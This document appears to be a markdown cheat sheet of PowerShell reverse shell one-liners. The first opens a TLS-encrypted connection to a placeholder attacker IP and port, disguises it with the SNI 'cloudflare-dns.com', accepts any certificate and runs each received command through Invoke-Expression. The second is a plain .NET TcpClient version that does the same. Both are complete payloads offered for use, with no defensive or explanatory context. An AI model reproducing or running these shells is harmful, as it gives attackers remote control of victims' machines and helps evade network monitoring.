# PowerShell

## 01 - TLS Protocol

One-liner.

```powershell
$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('<attacker_IP>', <attacker_PORT>); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({ $true } -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient('cloudflare-dns.com', $null, $sslProtocols, $false); if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) { $SslStream.Close(); exit} $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) { [byte[]]$script:Buffer = New-Object System.Byte[] 4096; $StreamWriter.Write($String + 'PS' + (Get-Location).Path '> '); $StreamWriter.Flush() }; WriteToStream ''; while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String } WriteToStream ($Output) } $StreamWriter.Close()
```

## 02 - DotNET

```powershell
PS C:\> $client = [System.Net.Sockets.TcpClient]::new("<IP>", "<PORT>"); $stream = $client.GetStream(); $reader = [System.IO.StreamReader]::new($stream); $writer = [System.IO.StreamWriter]::new($stream); while ($client.Connected) { while ($stream.DataAvailable) { $command = $reader.ReadLine(); $output = (Invoke-Expression $command) 2>&1 | ForEach-Object { $writer.WriteLine($_) }; $writer.Flush(); } }
```